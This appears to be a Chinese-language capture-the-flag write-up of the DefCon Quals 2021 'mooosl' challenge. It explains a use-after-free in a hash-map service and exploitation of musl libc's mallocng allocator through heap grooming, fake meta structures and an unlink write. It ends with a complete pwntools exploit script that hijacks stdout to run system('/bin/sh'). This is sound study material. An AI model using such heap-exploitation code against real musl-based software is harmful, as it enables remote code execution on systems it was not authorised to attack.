# 借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）

阅读量 **202363**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-04 14:30:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t015f5ff9f616a7eadc.png)

上篇我们大致过了一遍musl libc
1.2.2的mallocng源码，了解到musl堆管理器用以下的结构管理着meta、group以及chunk。本篇我们继续来分析mooosl这道题的解题思路。

![](https://p0.ssl.qhimg.com/t012d0a4aecc90dd7d6.png)

## 静态分析

保护全开

![](https://p4.ssl.qhimg.com/t01bb8752c1dec377e7.png)

程序主要提供了`store`、`query`、`delete`这几个功能，下面逐个功能进行分析

![](https://p4.ssl.qhimg.com/t01e41a52199de1fbfa.png)

sotre，申请0x30的chunk，用于存放key、value以及对应的size，另外还会算出hash和prev_hash_map（保存着hash_map先前在该处的指针）

![](https://p4.ssl.qhimg.com/t019397e71f8f18ab8e.png)

set_key和set_value，比较类似，根据输入的size去申请chunk，然后填入key和value，所以store方法一共会申请3个chunk

![](https://p4.ssl.qhimg.com/t011e341473e70274e5.png)

get_hash，返回一个hash值，返回后只取低12位，根据这个hash得到hash_map[hash&0xfff]，先将hash_map[hash&0xfff]原有的值保存在prev_hash_map，然后将0x30
chunk的地址存入hash_map[hash&0xfff]

![](https://p1.ssl.qhimg.com/t0148443ba104b887bd.png)

query，查询功能，根据输入的key，找到对应的value并以hex字符串形式输出。注意到这里调了set_key，会先申请chunk用于存放key，最后再free掉。

![](https://p1.ssl.qhimg.com/t016667db858091e72b.png)

查找过程是遍历hash_map找到对应key，如果prev_hash_map不为零，则会打印出prev_hash_map的数据

![](https://p4.ssl.qhimg.com/t01bbfa1015fefce2e1.png)

delete，删除功能，如果从hash_map中找到对应的key，则会从free掉对应的3个chunk，最后再free掉调set_key时产生的chunk。另外，如果prev_hash_map不为0，则会将hash_map[hash&0xfff]置为prev_hash_map后再free掉prev_hash_map所指向的chunk。

![](https://p4.ssl.qhimg.com/t0193142eae402ebad0.png)

很明显，如果hash_map[hash&0xfff]的原有的值为0，则delete后会将hash_map[hash&0xfff]清0，可通过连续store两次相同hash去绕过。而且，在上一篇文章中我们了解到musl
libc在free掉一个chunk时不会讲user data域置。所以，当绕过了`*v2 = (struct_v1
*)ptr->prev_hash_map`之后，就相当于有了一个uaf漏洞。

## Leak libc

知道了musl堆的重分配机制，泄露内存地址的思路就比较清晰了

group对chunk的管理策略：  
1.chunk按照内存先后，依次分配；  
2.free掉的chunk不能马上分配；  
3.需要等group内所有chunk都处于freed或者used状态时，才会将freed状态的chunk转换成avaliable；  
4.分配chunk时，会将user data域用\x00初始化。

采取的堆风水策略  
1.先store一次垫着group header防止free掉group所有chunk时，将整个group内存归还给堆管理器；  
2.除最后一个与第一个chunk，其余全部free掉；  
3.申请一个`\n` struct chunk（这个chunk存放着key value指针），这时候key chunk和value
chunk便会落在struct chunk的内存之前，value chunk与struct chunk相同size；  
4.free掉struct chunk，然后再free掉group内除第一个的所有chunk，再申请一个struct chunk（key value
chunk size不为0x30）  
5.这时，这个struct chunk便落在`\n` struct chunk的value chunk域内，通过query(‘\n’)便可打印出内存信息。

    
    
    ###Info Leak
    store('A', 'A')#AAAAAAU
    
    #clear for reusing freed chunks
    for _ in range(5):
        query('A' * 0x30)#AFFFFFU
    
    store('\n', 'A' * 0x30)#UAAAAAU -> UAAAA[U]U #0x4040+0x7e5*8 = 0x7f68   []就是要控的chunk
    store(find_key(), 'A')#UAAAU[U]U
    delete('\n')#FAAAU[F]U
    
    #clear for reusing freed chunks
    for _ in range(3):
        query('A' * 0x30)#FFFFU[F]U
    
    store('A\n', 'A', 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr
    query('\n')
    

![](https://p0.ssl.qhimg.com/t01174dec2891687fe4.png)

继续利用该策略将libc基地址等内存信息leak出来

![](https://p2.ssl.qhimg.com/t01636fb6f9d0c7c748.png)

## 从musl unlink到FSOP

利用meta dequeue方法的unlink漏洞可以达到任意写的效果

![](https://p2.ssl.qhimg.com/t0186a387a1a40666d0.png)

注意到nontrivial_free方法，当g->freed_mask | g->avail_mask为0时，也就是当所有块都在使用中，这时可以引入next
meta和group进行块处理。也就是可以引用fake meta，并通过其返回任意地址。

![](https://p2.ssl.qhimg.com/t0132707deeb51d2df7.png)

构造一个fake meta，数据结构需要符合get_meta方法

    
    
    # Overwrite stdout-0x10 to fake_meta_addr using dequeue during free
    sc = 8 # 0x90
    freeable = 1
    last_idx = 0
    maplen = 1
    fake_meta = b''
    fake_meta += p64(stdout - 0x18) # prev
    fake_meta += p64(fake_meta_addr + 0x30) # next
    fake_meta += p64(fake_mem_addr) # mem
    fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    
    fake_mem = b''
    fake_mem += p64(fake_meta_addr) # meta
    fake_mem += p32(1) # active_idx
    fake_mem += p32(0)
    
    payload = b''
    payload += b'A' * 0xaa0
    payload += p64(secret) + p64(0)
    payload += fake_meta
    payload += fake_mem
    payload += b'\n'`
    

如上，将fake mem放置在fake
meta相邻位置，提前布置好avail_mask、freed_mask、last_idx等结构。另外，还需要页对齐，并且页首8个byte需要布置一个page
secret数据，绕过meta的check。

![](https://p1.ssl.qhimg.com/t01ac81f856ebf92860.png)

unlink，在`&(stdout-0x18)->prev = &(stdout-0x10)`处写入fake_mem的地址

![](https://p5.ssl.qhimg.com/t01674278052de8d9b6.png)

通过queue方法令fake meta进入ctx.active列表

![](https://p5.ssl.qhimg.com/t011775e22b94b837c6.png)

`sc=0x8`的group已经由fake meta进行管理

![](https://p1.ssl.qhimg.com/t0148237b12639eacc3.png)

现在可以随意修改fake_meta的fake_mem，令其指向`stdout-0x10`

![](https://p2.ssl.qhimg.com/t01ee23fa4891c7949e.png)

申请size
0x80的chunk，便会将`stdout-0x10`分配回来。然后覆盖stdout->write函数指针为system，在stdout->flags写入`/bin/sh\x00`，并且保证`stdin->wpos
!= stdin->wbase`

![](https://p1.ssl.qhimg.com/t0127e9e852d44f32ca.png)

getshell~

![](https://p3.ssl.qhimg.com/t01c2c392c5997c673e.png)

## Script

完整EXP

    
    
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import codecs
    
    context.terminal = ['terminator', '--new-tab', '-x']
    #context.terminal = ['terminator', '-x', 'sh', '-c']
    context.log_level = 'debug'
    context.arch = 'amd64'
    
    DEBUG = 1
    TARGET = './mooosl'
    LIBCSO = './libc.so'
    #LIBCSO = '/lib/x86_64-linux-musl/libc.so'
    #LIBCSO = './libc.so'
    #LIBCSO = '/mnt/hgfs/sharefd/envs/musl/1.2.2/local.x64/lib/x86_64-linux-musl/libc.so'
    MODULE = LIBCSO
    GLOBAL = '''
    mcinit -a 1.2.2
    b dequeue
    b queue
    p __malloc_context
    '''
    
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    
    if DEBUG == 0:
        p = process(TARGET)
        text_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, TARGET.split('/')[-1])).readlines()[1], 16)
        libs_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, MODULE.split('/')[-1])).readlines()[0],16)
    elif DEBUG == 1:
        p = process(TARGET, env={'LD_PRELOAD' : './libc.so.6'})
        text_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, TARGET.split('/')[-1])).readlines()[1], 16)
        libs_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, MODULE.split('/')[-1])).readlines()[0],16)
    elif DEBUG == 2:
        p = remote('mooosl.challengep.ooo', 23333)
    elif DEBUG == 3:
        r = ssh(host=host, user='username', password='passwd')
        p = r.shell()
    
    elf = ELF(TARGET)
    libc = ELF(LIBCSO)
    
    def debug(addr = 0):
        if addr != 0:
            gdb.attach(p, 'b *{}{}'.format(hex(addr), GLOBAL))
        else:
            gdb.attach(p, '{}'.format(GLOBAL))
    
    def store(key_content, value_content, key_size=None, value_size=None, wait=True):
        p.sendlineafter('option: ', '1')
        if key_size is None:
            key_size = len(key_content)
        p.sendlineafter('size: ', str(key_size))
        p.sendafter('content: ', key_content)
        if value_size is None:
            value_size = len(value_content)
        p.sendlineafter('size: ', str(value_size))
        if wait:
            p.recvuntil('content: ')
        p.send(value_content)
    
    def query(key_content, key_size=None, wait=True):
        p.sendlineafter('option: ', '2')
        if key_size is None:
            key_size = len(key_content)
        p.sendlineafter('size: ', str(key_size))
        if wait:
            p.recvuntil('content: ')
        p.send(key_content)
    
    def delete(key_content, key_size=None):
        p.sendlineafter('option: ', '3')
        if key_size is None:
            key_size = len(key_content)
        p.sendlineafter('size: ', str(key_size))
        p.sendafter('content: ', key_content)
    
    def get_hash(content):
        x = 0x7e5
        for c in content:
            x = ord(c) + x * 0x13377331
        return x & 0xfff
    
    def find_key(length=0x10, h=0x7e5):
        while True:
            x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
            if get_hash(x) == h:
                return x
    
    def pwn():
        info("pwnit!")
        ###Info Leak
        store('A', 'A')#AAAAAAU
    
        #clear for reusing freed chunks
        for _ in range(5):
            query('A' * 0x30)#AFFFFFU
    
        store('\n', 'A' * 0x30)#UAAAAAU -> UAAAA[U]U #0x4040+0x7e5*8 = 0x7f68   []就是要控的chunk
        store(find_key(), 'A')#UAAAU[U]U
        delete('\n')#FAAAU[F]U
    
        #clear for reusing freed chunks
        for _ in range(3):
            query('A' * 0x30)#FFFFU[F]U
    
        store('A\n', 'A', 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr
        query('\n')
    
        res = codecs.decode(p.rl(False).split(b':')[1], 'hex')
        mmap_base = u64(res[:8]) - 0x20
        chunk_addr = u64(res[8:0x10])
    
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(chunk_addr - 0x60) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        heap_base = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8]) - 0x1d0
    
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(heap_base + 0xf0) + p64(0) + p64(0x200) + p64(0x7e5) + p64(0))
        query('\n')
        libc.address = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8]) - 0xb7040
    
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(next(libc.search(b'/bin/sh\0'))) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        assert codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8] == b'/bin/sh\0'
    
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(heap_base) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        secret = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8])
    
        log.info('mmap base: %#x' % mmap_base)
        log.info('chunk address: %#x' % chunk_addr)
        log.info('heap base: %#x' % heap_base)
        log.info('libc base: %#x' % libc.address)
        log.info('secret: %#x' % secret)
    
        fake_meta_addr = mmap_base + 0x2010
        fake_mem_addr = mmap_base + 0x2040
        stdout = libc.address + 0xb4280  
        log.info('fake_meta_addr: %#x' % fake_meta_addr)
        log.info('fake_mem_addr: %#x' % fake_mem_addr)
        log.info('stdout: %#x' % stdout)
    
        # Overwrite stdout-0x10 to fake_meta_addr using dequeue during free
        sc = 8 # 0x90
        freeable = 1
        last_idx = 0
        maplen = 1
        fake_meta = b''
        fake_meta += p64(stdout - 0x18) # prev
        fake_meta += p64(fake_meta_addr + 0x30) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
        fake_meta += p64(0)
    
        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)
    
        payload = b''
        payload += b'A' * 0xaa0
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'
    
        for _ in range(2):
            query('A' * 0x30)
        query(payload, 0x1200)
        store('A', p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        delete('\n')
    
        # Create a fake bin using enqueue during free
        sc = 8 # 0x90
        last_idx = 1
        fake_meta = b''
        fake_meta += p64(0) # prev
        fake_meta += p64(0) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += p64(0)
    
        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)
    
        payload = b''
        payload += b'A' * 0xa90
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'
    
        query('A' * 0x30)
        query(payload, 0x1200)
        store('A', p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        delete('\n')
    
        # Overwrite the fake bin so that it points to stdout
        fake_meta = b''
        fake_meta += p64(fake_meta_addr) # prev
        fake_meta += p64(fake_meta_addr) # next
        fake_meta += p64(stdout - 0x10) # mem
        fake_meta += p32(1) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += b'A' * 0x18
        fake_meta += p64(stdout - 0x10)
    
        payload = b''
        payload += b'A' * 0xa80
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += b'\n'
        query(payload, 0x1200)
    
        # Call calloc(0x80) which returns stdout and call system("/bin/sh") by overwriting vtable
        payload = b''
        payload += b'/bin/sh\0'
        payload += b'A' * 0x20
        payload += p64(heap_base + 1)
        payload += b'A' * 8
        payload += p64(heap_base)
        payload += b'A' * 8
        payload += p64(libc.symbols['system'])
        payload += b'A' * 0x3c
        payload += p32((1<<32)-1)
        payload += b'\n'
        store('A', payload, value_size=0x80, wait=False)
        #debug()
    
        p.irt()
    
    if __name__ == "__main__":
        pwn()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sung3r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241104](/post/id/241104)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [heap](/tag/heap)
  * [musl libc](/tag/musl libc)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t0150f9fdc132075c49.png) sung3r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

